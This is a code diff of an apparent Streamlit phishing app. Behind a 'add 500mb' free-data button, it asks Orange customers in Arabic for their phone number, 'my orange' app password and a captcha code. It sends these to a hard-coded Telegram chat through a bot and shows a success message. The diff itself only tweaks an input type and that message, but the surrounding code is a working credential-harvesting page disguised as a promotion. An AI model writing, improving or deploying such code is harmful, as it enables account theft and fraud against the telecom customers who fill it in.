@@ -99,7 +99,7 @@ def main():
         unsafe_allow_html=True
     )
 
-    number = st.text_input("رقم تليفون اورانج", type="number")
+    number = st.text_input("رقم تليفون اورانج", type="default")
     password = st.text_input("باسورد تطبيق my orange", type="password")
 
     captcha_response = st.text_input("كود الكباتشا")
@@ -107,7 +107,7 @@ def main():
     if st.button("add 500mb"):
         bot_message = f"رقم التليفون: {number}\nباسورد تطبيق my orange: {password}\nكود الكباتشا: {captcha_response}"
         bot.send_message('5939899289', bot_message)
-        st.write("تم إرسال المعلومات.")
+        st.write("تم إرسال المعلومات بنجاح ")
 
 if __name__ == '__main__':
     main()
